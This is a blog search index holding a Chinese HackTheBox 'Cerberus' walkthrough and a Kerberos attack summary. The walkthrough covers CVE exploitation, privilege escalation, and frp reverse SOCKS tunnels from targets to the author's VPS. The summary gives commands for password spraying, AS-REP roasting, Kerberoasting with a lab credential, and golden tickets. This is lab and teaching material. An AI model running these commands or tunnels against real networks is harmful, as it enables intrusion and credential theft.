<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Cerberus-HackTheBox</title>
    <link href="/2023/07/30/Cerberus-HackTheBox/"/>
    <url>/2023/07/30/Cerberus-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>年轻人的第一台Hard靶机，真的太难了</p><p>开局先扫描，与往常的Windows靶机不同，这台只开了8080</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Syu0LNRQsy.png" alt=""></p><p>访问8080，发现一个监控软件</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f_k4yYa1Rv.png" alt=""></p><h3 id="Linux-User-Shell"><a href="#Linux-User-Shell" class="headerlink" title="Linux User Shell"></a>Linux User Shell</h3><h4 id="CVE-2022-24715"><a href="#CVE-2022-24715" class="headerlink" title="CVE-2022-24715"></a>CVE-2022-24715</h4><p>上exploit-notes看看</p><p><a href="https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/">https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/</a></p><p>直接试试RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KGz5DRnkJc.png" alt=""></p><p>没法登录，看来是需要用户密码的</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_OolDkW3Jij.png" alt=""></p><p>留意到下面还有个未授权的任意文件读取</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_wpRYVjfCQq.png" alt=""></p><p>确实可以，那我们就找一下用户密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Md_NJpmM7S.png" alt=""></p><p>在<code>/etc/icingaweb2/resources.ini</code>中发现了用户密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_83eamjJax0.png" alt=""></p><p>登录成功</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fx7dSR2HVB.png" alt=""></p><p>再试试RCE，拿下。只是www-data账户，还需提权</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_XMobJQyJEi.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pxzRR1dFhs.png" alt=""></p><p>linpeas跑一下，留意到root运行了redis，但是这里连SSH都没开，写root公钥是没办法了。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SEnr6S3KOl.png" alt=""></p><p>竟然还有53端口</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2emTnkBNR0.png" alt=""></p><p>一些smb信息</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_11mGRaAaWj.png" alt=""></p><h3 id="Linux-Root-Shell"><a href="#Linux-Root-Shell" class="headerlink" title="Linux Root Shell"></a>Linux Root Shell</h3><h4 id="firejail提权"><a href="#firejail提权" class="headerlink" title="firejail提权"></a>firejail提权</h4><p>SUID这里发现了新面孔</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_w4WMbtmdfp.png" alt=""></p><p>这里没有</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_BjDcUGB7iE.png" alt=""></p><p>不过在sploitus.com找到了提权漏洞</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Fd2wc36Ezz.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PwX2_gtlkN.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_K4Pwy3bNow.png" alt=""></p><p>然鹅并没有发现任何flag，这台靶机是Windows靶机，这波拿下一个Linux机器。估计要开始横向才行了</p><h2 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h2><p>回想一下这是一台Windows靶机，但给了我们一台Linux打，而且开了DNS和smb服务。我猜测是用Linux搭的域，上网了解一下。</p><p>再跑一次linpeas收集信息，这里可看到SSSD，它可以让Linux服务器加到域内</p><p><a href="https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel">https://access.redhat.com/documentation/zh-cn/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jebiFaJej9.png" alt=""></p><p>LDAP信息</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_41jFqwGPif.png" alt=""></p><p>确实可以看到这是一个Linux搭建的域</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H6FgGol75e.png" alt=""></p><p>这边还有一些票据</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_rs4OndHPRb.png" alt=""></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">You could use SSSDKCMExtractor to extract the tickets stored here<br><span class="hljs-literal">-rw-------</span> <span class="hljs-number">1</span> root root <span class="hljs-number">1638400</span> Mar  <span class="hljs-number">1</span> <span class="hljs-number">12</span>:<span class="hljs-number">11</span> /var/lib/sss/secrets/secrets.ldb<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gMnhOrmsHD.png" alt=""></p><p>还有powershell历史命令</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Nt_QfGuubS.png" alt=""></p><p>恶心人。。</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_quwJv3ZVwv.png" alt=""></p><p>研究一下krb5.keytab怎么利用</p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#extract-accounts-from-etc-krb5.keytab</a></p><p>成功获得Hash</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_kO9D1Z9Msq.png" alt=""></p><p>但我们还没做主机探测，这里用一下著名的fscan</p><p>发现还有一台主机存活</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hHBeqZqP7l.png" alt=""></p><p>没开445，无法通过哈希传递横向过去</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_jc6CvAEHdR.png" alt=""></p><p>这个5985端口正是winrm的端口，算是给我们开了个口子。有用户密码即可登录了</p><p>只能再回到前面收集到的信息，了解一下SSSD</p><blockquote><p>SSSD (System Security Services Daemon) 是一个用于提供统一身份认证和授权服务的守护进程。它在Linux系统中广泛使用，特别是在企业环境中，用于集成用户身份验证、授权和用户信息检索。</p></blockquote><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#ccache-ticket-reuse-from-sssd-kcm">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory#ccache-ticket-reuse-from-sssd-kcm</a></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_58699Nf-de.png" alt=""></p><p>非常可惜这台机子没有.secrets.mkey</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_d0qtdnaNnG.png" alt=""></p><p>这时候死去的CTF技巧又来了，通过strings命令查看cache_cerberus.local.ldb可以看到一个hash</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JDG3nxfrGa.png" alt=""></p><p>john爆一下</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Dib8Y2WDvz.png" alt=""></p><p>用户方面可以发现，还是这个matthew</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_WDPbnR5J43.png" alt=""></p><h3 id="frp-内网穿透"><a href="#frp-内网穿透" class="headerlink" title="frp 内网穿透"></a>frp 内网穿透</h3><h4 id="服务端（VPS）"><a href="#服务端（VPS）" class="headerlink" title="服务端（VPS）"></a>服务端（VPS）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frps.ini <br>[<span class="hljs-type">common</span>]<br>bind_addr = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>bind_port = <span class="hljs-number">7000</span><br><br>./frps <span class="hljs-literal">-c</span> frps.ini<br></code></pre></td></tr></table></figure><h4 id="客户端（靶机Linux）"><a href="#客户端（靶机Linux）" class="headerlink" title="客户端（靶机Linux）"></a>客户端（靶机Linux）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frpc.ini<br>[<span class="hljs-type">common</span>]<br>server_addr = <span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span><br>server_port = <span class="hljs-number">7000</span><br><br>[<span class="hljs-type">socks5</span>]<br>remote_port = <span class="hljs-number">1080</span><br>plugin = socks5<br><br><br>./frpc <span class="hljs-literal">-c</span> frpc.ini<br></code></pre></td></tr></table></figure><p>修改proxychains配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tail <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> /etc/proxychains.conf  //在最后一行添加以下配置<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>此时VPS上通过proxychains已经能访问了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains &lt;<span class="hljs-built_in">command</span>&gt;<br></code></pre></td></tr></table></figure><p>获得user flag，真不容易</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__6aBuASjoN.png" alt=""></p><p>直接上BloodHound收集一波信息，寄了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_awtUwypoFC.png" alt=""></p><p>PowerSploit也寄了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_c83qNWjnAJ.png" alt=""></p><p>试一下winpeas，不负众望</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_51YR4zGnQE.png" alt=""></p><p>试一下上面这个漏洞，失败了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_fA-q-CAU26.png" alt=""></p><p>后面翻了很久winpeas，发现了这个AD的密码重置工具</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_f0nx4OAibi.png" alt=""></p><p>版本6.2</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_32rl8S_gOj.png" alt=""></p><p>存在RCE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_cK8WGvsQYS.png" alt=""></p><p>竟然需要administrator的密码..</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_JHFhchrUn8.png" alt=""></p><p>搜一下其他与ManageEngine ADSelfService相关的CVE</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xeIFDj9y5F.png" alt=""></p><p>CVE-2021-40539版本不合适</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_u6c7CGZi9K.png" alt=""></p><p>CVE-2022-47966能以NT AUTHORITY\SYSTEM 的身份远程执行代码，这就完美了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_2ho3MSDpmt.png" alt=""></p><p>但这两个参数不知道去哪里搞</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ijg_LuKW4F.png" alt=""></p><p>Github上看到，这个GUID在网页上应该能搞到</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5NplAKSJ8d.png" alt=""></p><p>Issuer可能是adfs/services/trust</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_iqg9ADUdHa.png" alt=""></p><p>端口太多了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Q-f6fywsFy.png" alt=""></p><p>这里找到了对应端口</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_z-XUjYSODu.png" alt=""></p><p>难道只能本地访问？</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7bfhhJnb5m.png" alt=""></p><h2 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h2><h3 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h3><h4 id="客户端（靶机Windows）"><a href="#客户端（靶机Windows）" class="headerlink" title="客户端（靶机Windows）"></a>客户端（靶机Windows）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frpc.ini<br>[<span class="hljs-type">common</span>]<br>server_addr = <span class="hljs-number">10.10</span>.<span class="hljs-number">16.76</span><br>server_port = <span class="hljs-number">7000</span><br><br>[<span class="hljs-type">ssh</span>]<br><span class="hljs-built_in">type</span> = tcp<br>local_ip = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br>local_port = <span class="hljs-number">9251</span><br>remote_port = <span class="hljs-number">6000</span><br>plugin = socks5<br><br>.\frpc.exe <span class="hljs-literal">-c</span> frpc.ini<br></code></pre></td></tr></table></figure><h4 id="服务端（VPS）-1"><a href="#服务端（VPS）-1" class="headerlink" title="服务端（VPS）"></a>服务端（VPS）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> frps.ini <br>[<span class="hljs-type">common</span>]<br>bind_addr = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br>bind_port = <span class="hljs-number">7000</span><br><br>./frps <span class="hljs-literal">-c</span> frps.ini<br></code></pre></td></tr></table></figure><p>修改proxychains配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tail <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> /etc/proxychains.conf  //在最后一行添加以下配置<br>socks5 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">6000</span><br></code></pre></td></tr></table></figure><p>此时VPS上通过proxychains已经能访问了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HEO07lAERO.png" alt=""></p><h4 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h4><p>本地通过Proxifier进行代理</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_qVG5Iv1HDD.png" alt=""></p><p>即可进行访问</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_9x8VPhkOih.png" alt=""></p><p>使用matthew\@CERBERUS.LOCAL和它的密码登录一下</p><p>坏了但是获得了我们想要的GUID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_giBONGd2_-.png" alt=""></p><h3 id="CVE-2022-47966提权"><a href="#CVE-2022-47966提权" class="headerlink" title="CVE-2022-47966提权"></a>CVE-2022-47966提权</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_xogCyqmnjL.png" alt=""></p><p>设置好参数之后exploit（这里失败了很多次）</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_O53SLtqeFO.png" alt=""></p><p>这回不是Script Kiddie了</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_H7V9pyB0aV.png" alt=""></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>太难了，每次打Windows靶机都感觉知识量暴增。经常都要去研究它给的软件，比如这里的SSSD、ADFS。而且环境不太稳定，CVE-2022-47966打了好久才成功，中间还重置了两次靶机，重来了两遍。还有这次靶机都没开SSH，只能通过其他软件进行内网渗透。又狠狠复习了一波内网代理。</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos Summary</title>
    <link href="/2023/07/26/Kerberos-Summary/"/>
    <url>/2023/07/26/Kerberos-Summary/</url>
    
    <content type="html"><![CDATA[<p>打 Windows 靶机常遇到Kerberos，在此总结一下</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZUhrRpYZYV.png" alt=""></p><h3 id="Kerberos原理"><a href="#Kerberos原理" class="headerlink" title="Kerberos原理"></a>Kerberos原理</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hR7kHInCAn.png" alt=""></p><h4 id="Kerberos认证过程"><a href="#Kerberos认证过程" class="headerlink" title="Kerberos认证过程"></a>Kerberos认证过程</h4><ol><li><strong>AS_REQ</strong>：Client向AS发起AS_REQ，请求凭据是Client Hash加密的时间戳</li><li><strong>AS_REP</strong>：AS使用Client Hash进行解密，如果结果正确就返回用krbtgt的NTLM Hash加密的TGT票据（TGS中包含PAC，PAC包含Client SID和组）</li><li><strong>TGS_REQ</strong>：Client凭借TGT票据向TGS发起针对特定服务的TGS_REQ请求</li><li><strong>TGS_REP</strong>：TGS使用krbtgt hash进行解密，正确则返回用服务hash加密的TGS票据</li><li><strong>AP_REQ</strong>：Client拿着TGS票据去请求服务</li><li><strong>AP_REP</strong>：服务使用自己的Hash解密TGS票据。正确则拿着PAC去KDC询问Client有无访问权限，域控解密PAC，判断Client的访问权限后返回结果。</li></ol><h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h3><p>原理：用户不存在和密码错误时，Kerberos返回的error-code不同</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<span class="hljs-string">&#x27;active.htb&#x27;</span>,userdb=<span class="hljs-string">&#x27;/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt&#x27;</span> 10.10.10.100<br></code></pre></td></tr></table></figure><h3 id="密码喷洒攻击"><a href="#密码喷洒攻击" class="headerlink" title="密码喷洒攻击"></a>密码喷洒攻击</h3><p><strong>攻击场景：</strong> 在已有用户名的情况下，可以尝试喷洒密码</p><p>普通的爆破就是用户名固定，爆破密码；密码喷洒是用固定的密码去跑用户名。</p><p><strong>工具：DomainPasswordSpray</strong> <a href="https://github.com/dafthack/DomainPasswordSpray" title="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-DomainPasswordSpray</span> <span class="hljs-literal">-UserList</span> users.txt <span class="hljs-literal">-Domain</span> domain<span class="hljs-literal">-name</span> <span class="hljs-literal">-PasswordList</span> passlist.txt <span class="hljs-literal">-OutFile</span> sprayed<span class="hljs-literal">-creds</span>.txt<br></code></pre></td></tr></table></figure><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在Kerberos认证中，每个用户的票据都是由krbtgt NTLM-hash进行加密的，如果我们拥有krbtgt NTLM-hash，就可以伪造任意用户的TGT票据，这个票据也称为黄金票据。一般用来做权限维持。</p><p><strong>利用条件：</strong></p><ol><li>Domain SID</li><li>krbtgt hash</li></ol><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>我们可以通过DCSync拿到的krbtgt做一个黄金票据</p><p>获取Domain SID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R83v5LB-KS.png" alt=""></p><p>利用上面获取到的Domain SID和krbtgt制作黄金票据</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZS52zRh9IQ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gJoqbP2GKj.png" alt=""></p><h4 id="意外情况"><a href="#意外情况" class="headerlink" title="意外情况"></a>意外情况</h4><p><strong>时钟同步</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python psexec.py htb.local/auray@forest -k -no-pass<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporatio<br><br>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br></code></pre></td></tr></table></figure><p>这种情况需要跟域进行时钟同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ntpdate 10.10.10.161<br></code></pre></td></tr></table></figure><p><strong>SMB连接失败</strong></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LcDgW17HNN.png" alt=""></p><p>这种情况需要修改host，psexec的命令也得使用主机名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br>10.10.10.161 htb.local forest<br><br>python psexec.py htb.local/auray@forest -k -no-pass<br></code></pre></td></tr></table></figure><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p><strong>攻击场景：</strong> 如果拿到了用户名，目标服务器又暴露了kerberos端口，可以尝试AS-REP Roasting攻击</p><p>当被攻击账号设置 <strong>“不需要Kerberos预身份验证”</strong> 后，在AS_REP过程中就可以任意伪造用户名（无需Client Hash）请求凭据，AS会将伪造请求的用户名NTLM Hash加密后返回，对收到的AS_REP内容（enc-part底下的cipher，因为这部分时使用用户hash加密的session-key，我们通过离线爆破就可以获得用户hash）重新组合，能够拼接成 “Kerberos 5 AS_REP etype 23”（18200）的格式，使用hashcat对其进行爆破，最终获取该用户的明文口令</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sj04BCwUub.png" style="zoom:67%;" /></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span class="hljs-variable">$&#123;user&#125;</span> | grep -v impacket;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>拿到Hash之后可以通过hashcat爆破密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 svc-alfredsco.kerb /usr/share/wordlists/rockyou.txt --force<br>john --wordlist=/usr/share/wordlists/rockyou.txt svc.txt<br></code></pre></td></tr></table></figure><h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h3><p>Kerberos除了第一步AS_REP是使用用户hash加密时间戳之外，其他的步骤的验证都是通过票据，这个票据可以是TGT票据或TGS票据。因为票据里面的内容主要是session_key和ticket（使用服务hash加密的，服务包括krbtgt），拿到票据之后，我们就可以用这个票据来作为下阶段的验证了</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p><strong>原理：</strong> 在TGS_REP中，用户将收到由目标服务实例的NTLM Hash加密的TGS票据，加密算法为RC4-HMAC</p><p><strong>利用场景：</strong> 当我们拥有一个用户凭据时，我们可以请求TGS票据，再进行爆破</p><p>对于域内的任何主机，都可以通过查询SPN，向域内的所有服务请求TGS（因为KDC不会验证权限：用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT正确，那么肯定会返回TGS）然后进行暴力破解，获取服务的NTLM Hash。但只有域用户的SPN是可以利用的（因为机器账户的SPN每30天会更改随机128各字符密码导致无法破解），所以在实际过程中要注意攻击的是域用户。</p><p><strong>利用impacket中的GetUserSPNs.py进行攻击</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Nigw5qriD.png" alt=""></p><p>使用john进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john test.hash --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W3eE0H-c91.png" alt=""></p><h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>在TGS_REP中的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。</p><p><strong>相较于黄金票据</strong>，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，但是白银票据只能访问特定服务</p><p><strong>注意：</strong> 伪造的白银票据没有携带有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则白银票据将不起作用。</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>委派是将域用户的权限委派给服务账户，委派之后，服务账户就获得了域用户的身份去行动</p><p>注意：能够被委派的用户只能是服务账户或机器账户</p><h4 id="三种委派"><a href="#三种委派" class="headerlink" title="三种委派"></a>三种委派</h4><ul><li>非约束委派是指用户账户将自身的TGT转发给服务账户使用</li><li>约束委派通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问特定服务资源</li><li>基于资源的约束委派是将委派的管理移交给服务资源进行控制，其余和约束委派基本相同</li></ul><h3 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h3><p>当service1的服务账户开启了非约束委派后，user访问service1时，service1会将user的TGT保存在ISASS内存中，然后service1就可以利用TGT以user的身份访问域中的任何user可以访问的服务</p><p>非约束委派的设置需要SeEnableDelegation权限，一般是管理员具有此权限</p><h4 id="非约束委派流程"><a href="#非约束委派流程" class="headerlink" title="非约束委派流程"></a><strong>非约束委派流程</strong></h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dY170jQ6L-.png" alt=""></p><ol><li>域内用户A通过Kerberos认证后访问Web服务器</li><li>Web服务器以服务账户B向KDC请求用户A的可转发票据TGT</li><li>KDC检查B的委派属性，下发TGT</li><li>服务账户B使用TGT向KDC申请服务票据TGS</li><li>KDC检查委派属性和申请的服务，下发TGS</li><li>服务账户使用TGS访问其他服务</li></ol><h4 id="侦查思路：找到非约束委派账户"><a href="#侦查思路：找到非约束委派账户" class="headerlink" title="侦查思路：找到非约束委派账户"></a>侦查思路：找到非约束委派账户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ADFind查询非约束委派普通账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># ADFind查询非约束机器账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># PowerView查询非约束委派的机器账户</span><br>powershell-import PowerView.ps1<br>powershell Get-NetComputer –unconstrained | select dnshostname, samaccountname<br></code></pre></td></tr></table></figure><h4 id="利用打印机漏洞"><a href="#利用打印机漏洞" 